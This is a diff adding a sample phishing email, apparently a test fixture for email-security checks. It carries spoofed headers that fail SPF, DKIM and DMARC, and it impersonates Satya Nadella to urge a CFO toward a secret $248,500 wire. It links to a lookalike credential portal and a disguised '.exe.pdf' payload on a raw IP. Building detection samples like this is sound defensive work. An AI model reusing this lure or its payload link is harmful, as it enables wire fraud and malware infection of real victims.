@@ -1,0 +1,35 @@
+From: "Satya Nadella [CEO Executive Office]" <ceo-office@paypaI-billing-service.net>
+To: "Chief Financial Officer" <cfo@enterprise-corp.com>
+Subject: URGENT: Executive Wire Transfer Confirmation - Invoice #88491
+Date: Mon, 7 Sep 2026 11:23:40 +0000
+Message-ID: <20260907112340.88491.exec@paypaI-billing-service.net>
+Reply-To: financial-exec-settlement@proton.me
+Return-Path: <bounce-gateway@relay-server-91.ru>
+Received: from mail-ed1-f27.google.com (mail-ed1-f27.google.com [142.250.190.27])
+    by mx.enterprise-corp.com with ESMTPS id j8si9928131
+    for <cfo@enterprise-corp.com>; Mon, 07 Sep 2026 11:24:01 +0000
+Received: from vps-bulletproof-mow.ru (vps-bulletproof-mow.ru [194.26.29.110])
+    by mail-ed1-f27.google.com with ESMTP id q4so891283
+    for <cfo@enterprise-corp.com>; Mon, 07 Sep 2026 11:23:43 +0000
+Received: from tor-exit-relay-nl.nodehost.net (tor-exit-relay-nl.nodehost.net [185.220.101.42])
+    by vps-bulletproof-mow.ru with SMTP id 994812; Mon, 07 Sep 2026 11:23:41 +0000
+Authentication-Results: mx.enterprise-corp.com;
+    spf=fail (sender IP is 185.220.101.42) smtp.mailfrom=bounce-gateway@relay-server-91.ru;
+    dkim=fail header.d=paypaI-billing-service.net header.b=X992a;
+    dmarc=fail (p=reject sp=reject) header.from=paypaI-billing-service.net
+Content-Type: text/html; charset="UTF-8"
+MIME-Version: 1.0
+
+<html>
+<body>
+<p>Dear Finance Team,</p>
+<p>Please process the attached urgent international wire settlement of <b>$248,500.00 USD</b> for our confidential strategic cloud acquisition (Invoice #88491).</p>
+<p>Due to strict non-disclosure obligations, do not discuss this over open internal channels. Complete the verification through our secured portal link below:</p>
+<p><a href="https://paypaI-billing-service.net/portal/invoice/auth-wire-confirm.php">Verify Wire Authorization & Download Signed Invoice Doc</a></p>
+<p>Direct download backup: <a href="http://185.220.101.42/payload/invoice-doc-88491.exe.pdf">http://185.220.101.42/payload/invoice-doc-88491.exe.pdf</a></p>
+<br>
+<p>Regards,<br>
+<b>Satya Nadella</b><br>
+Chief Executive Officer</p>
+</body>
+</html>
